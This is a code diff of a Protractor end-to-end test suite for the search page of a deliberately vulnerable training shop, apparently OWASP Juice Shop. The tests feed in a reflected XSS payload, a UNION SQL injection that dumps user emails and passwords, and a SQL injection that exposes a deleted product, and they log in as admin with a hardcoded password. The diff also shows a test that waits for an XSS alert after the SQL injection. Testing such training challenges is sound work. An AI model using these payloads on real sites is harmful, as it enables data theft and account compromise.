@@ -1,64 +1,69 @@
-'use strict';
+const config = require('config')
+const christmasProduct = config.get('products').filter(product => product.useForChristmasSpecialChallenge)[0]
 
-describe('/#/search', function () {
+describe('/#/search', () => {
+  let searchQuery, searchButton
 
-    var searchQuery, searchButton;
+  beforeEach(() => {
+    browser.get('/#/search') // not really necessary as search field is part of navbar on every dialog
+    searchQuery = element(by.model('searchQuery'))
+    searchButton = element(by.id('searchButton'))
+  })
 
-    beforeEach(function () {
-        browser.get('/#/search'); // not really necessary as search field is part of navbar on every dialog
-        searchQuery = element(by.model('searchQuery'));
-        searchButton = element(by.id('searchButton'));
-    });
+  describe('challenge "xss1"', () => {
+    it('search query should be susceptible to reflected XSS attacks', () => {
+      const EC = protractor.ExpectedConditions
 
-    describe('challenge "xss1"', function () {
+      searchQuery.sendKeys('<script>alert("XSS")</script>')
+      searchButton.click()
+      browser.wait(EC.alertIsPresent(), 5000, "'XSS' alert is not present")
+      browser.switchTo().alert().then(alert => {
+        expect(alert.getText()).toEqual('XSS')
+        alert.accept()
+      })
+    })
 
-        it('search query should be susceptible to reflected XSS attacks', function () {
-            searchQuery.sendKeys('<script>alert("XSS1")</script>');
-            searchButton.click();
+    protractor.expect.challengeSolved({challenge: 'XSS Tier 1'})
+  })
 
-            browser.switchTo().alert().then(function (alert) {
-                expect(alert.getText()).toEqual('XSS1');
-                alert.accept();
-            });
+  describe('challenge "unionSqlI"', () => {
+    it('search query should be susceptible to UNION SQL injection attacks', () => {
+      const EC = protractor.ExpectedConditions
 
-        });
+      searchQuery.sendKeys('\')) union select null,id,email,password,null,null,null,null from users--')
+      searchButton.click()
 
-        protractor.expect.challengeSolved({challenge: 'xss1'});
+      browser.wait(EC.alertIsPresent(), 5000, "'XSS' alert is not present")
+      browser.switchTo().alert().then(alert => {
+        expect(alert.getText()).toEqual('XSS')
+        alert.accept()
+      })
 
-    });
+      const productDescriptions = element.all(by.repeater('product in products').column('description'))
+      expect(productDescriptions.first().getText()).toBe('admin@' + config.get('application.domain'))
+    })
 
-    describe('challenge "unionSqlI"', function () {
+    protractor.expect.challengeSolved({challenge: 'User Credentials'})
+  })
 
-        it('search query should be susceptible to UNION SQL injection attacks', function () {
-            searchQuery.sendKeys('\')) union select null,id,email,password,null,null,null,null from users--');
-            searchButton.click();
+  describe('challenge "christmasSpecial"', () => {
+    protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})
 
-            var productDescriptions = element.all(by.repeater('product in products').column('description'));
-            expect(productDescriptions.first().getText()).toMatch(/admin@juice-sh.op/);
-        });
+    it('search query should reveal logically deleted christmas special product on SQL injection attack', () => {
+      searchQuery.sendKeys(christmasProduct.name + '%25\'))--')
+      searchButton.click()
 
-        protractor.expect.challengeSolved({challenge: 'unionSqlI'});
+      const productNames = element.all(by.repeater('product in products').column('name'))
+      expect(productNames.first().getText()).toBe(christmasProduct.name)
 
-    });
+      element(by.css('.fa-cart-plus')).element(by.xpath('ancestor::a')).click()
+      browser.wait(protractor.ExpectedConditions.presenceOf($('.alert-info')), 5000, 'Product addition info box not present.') // eslint-disable-line no-undef
 
-    describe('challenge "christmasSpecial"', function () {
-        protractor.beforeEach.login({email: 'admin@juice-sh.op', password: 'admin123'});
+      browser.get('/#/basket')
+      browser.wait(protractor.ExpectedConditions.presenceOf($('tr[data-ng-repeat="product in products"]')), 5000, 'Basket item list not present.') // eslint-disable-line no-undef
+      element(by.id('checkoutButton')).click()
+    })
 
-        it('search query should reveal logically deleted christmas special product on SQL injection attack', function () {
-            searchQuery.sendKeys('christmas%25\'))--');
-            searchButton.click();
-
-            var productNames = element.all(by.repeater('product in products').column('name'));
-            expect(productNames.first().getText()).toMatch(/Christmas Super-Surprise-Box \(2014 Edition\)/);
-
-            element(by.css('.fa-cart-plus')).element(by.xpath('ancestor::a')).click();
-
-            browser.get('/#/basket');
-            element(by.id('checkoutButton')).click();
-        });
-
-        protractor.expect.challengeSolved({challenge: 'christmasSpecial'});
-
-    });
-
-});
+    protractor.expect.challengeSolved({challenge: 'Christmas Special'})
+  })
+})
